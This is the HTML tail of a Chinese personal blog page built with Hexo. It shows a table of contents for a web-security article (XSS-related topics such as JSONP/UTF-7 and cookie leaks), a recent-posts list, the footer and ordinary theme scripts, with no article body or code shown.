href="#2-2-Apache-2-2-x%E7%89%88%E6%9C%AC%E8%AF%B7%E6%B1%82%E5%A4%B4%E8%B6%85%E9%95%BF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.2.</span> <span class="toc-text">2.2) Apache 2.2.x版本请求头超长泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%A0%E4%B8%8D%E6%8E%89%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8"><span class="toc-number">3.</span> <span class="toc-text">三、删不掉的本地存储</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%87%BD%E6%95%B0%E8%A6%86%E5%86%99%E7%9B%91%E5%90%AC%E4%B8%8A%E6%8A%A5"><span class="toc-number">4.</span> <span class="toc-text">四、函数覆写监听上报</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%86%85%E5%AD%98Cookie%E4%B8%8E%E7%A1%AC%E7%9B%98Cookie"><span class="toc-number">5.</span> <span class="toc-text">五、内存Cookie与硬盘Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81CSS%E5%B8%A6%E6%9D%A5%E7%9A%84%E7%82%B9%E5%87%BB%E9%87%8F%E6%B3%84%E9%9C%B2"><span class="toc-number">6.</span> <span class="toc-text">六、CSS带来的点击量泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%E3%80%81JSONP%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E4%B8%8EUTF-7%E7%BC%96%E7%A0%81"><span class="toc-number">7.</span> <span class="toc-text">七、JSONP回调函数与UTF-7编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-1-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">7.1.</span> <span class="toc-text">7.1) 基本原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-2-IE%E8%A7%A3%E6%9E%90UTF-7%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.2.</span> <span class="toc-text">7.2) IE解析UTF-7漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E8%BF%87%E6%BB%A4%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86"><span class="toc-number">8.</span> <span class="toc-text">八、过滤与代码混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E5%BF%83%E7%90%86%E5%AD%A6%E4%B8%8E%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6"><span class="toc-number">9.</span> <span class="toc-text">九、心理学与社会工程学</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#9-1%EF%BC%89%E8%AF%B1%E5%AF%BC%E8%A7%A6%E5%8F%91%E6%8B%96%E6%8B%BD%E4%BA%8B%E4%BB%B6"><span class="toc-number">9.1.</span> <span class="toc-text">9.1）诱导触发拖拽事件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-2-%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84QQ%E7%A9%BA%E9%97%B4%E2%80%9C%E4%BC%A0%E6%9F%93%E7%97%85%E6%AF%92%E2%80%9D"><span class="toc-number">9.2.</span> <span class="toc-text">9.2) 传说中的QQ空间“传染病毒”</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/lxx1997.github.io/2021/09/14/ssr-nextjs-01/" title="服务端 渲染 - nextjs"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/lxx1997.github.io/img/404.jpg'" alt="服务端 渲染 - nextjs"/></a><div class="content"><a class="title" href="/lxx1997.github.io/2021/09/14/ssr-nextjs-01/" title="服务端 渲染 - nextjs">服务端 渲染 - nextjs</a><time datetime="2021-09-14T14:31:56.000Z" title="Created 2021-09-14 22:31:56">2021-09-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/lxx1997.github.io/2021/08/15/threeJs-study-api/" title="threeJs 学习之路 - API 及 参数传递"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/lxx1997.github.io/img/404.jpg'" alt="threeJs 学习之路 - API 及 参数传递"/></a><div class="content"><a class="title" href="/lxx1997.github.io/2021/08/15/threeJs-study-api/" title="threeJs 学习之路 - API 及 参数传递">threeJs 学习之路 - API 及 参数传递</a><time datetime="2021-08-15T01:53:24.000Z" title="Created 2021-08-15 09:53:24">2021-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/lxx1997.github.io/2021/08/15/threeJs-study-01/" title="threeJs 学习之路 - 创建画布及绘制图形"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/lxx1997.github.io/img/404.jpg'" alt="threeJs 学习之路 - 创建画布及绘制图形"/></a><div class="content"><a class="title" href="/lxx1997.github.io/2021/08/15/threeJs-study-01/" title="threeJs 学习之路 - 创建画布及绘制图形">threeJs 学习之路 - 创建画布及绘制图形</a><time datetime="2021-08-15T01:38:18.000Z" title="Created 2021-08-15 09:38:18">2021-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/lxx1997.github.io/2021/06/14/design-parttern-01/" title="JavaScript 设计模式联系  -  创建型设计模式"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/lxx1997.github.io/img/404.jpg'" alt="JavaScript 设计模式联系  -  创建型设计模式"/></a><div class="content"><a class="title" href="/lxx1997.github.io/2021/06/14/design-parttern-01/" title="JavaScript 设计模式联系  -  创建型设计模式">JavaScript 设计模式联系  -  创建型设计模式</a><time datetime="2021-06-14T10:25:20.000Z" title="Created 2021-06-14 18:25:20">2021-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/lxx1997.github.io/2021/05/04/window-postMessage%E8%B7%A8%E5%9F%9F%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/" title="window.postMessage跨域的使用方式"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/lxx1997.github.io/img/404.jpg'" alt="window.postMessage跨域的使用方式"/></a><div class="content"><a class="title" href="/lxx1997.github.io/2021/05/04/window-postMessage%E8%B7%A8%E5%9F%9F%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/" title="window.postMessage跨域的使用方式">window.postMessage跨域的使用方式</a><time datetime="2021-05-04T15:23:18.000Z" title="Created 2021-05-04 23:23:18">2021-05-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By lxx</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/lxx1997.github.io/js/utils.js"></script><script src="/lxx1997.github.io/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/lxx1997.github.io/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/lxx1997.github.io/live2dw/assets/kesyoban.model.json"},"display":{"position":"left","width":300,"height":300},"mobile":{"show":false},"log":false});</script></body></html>
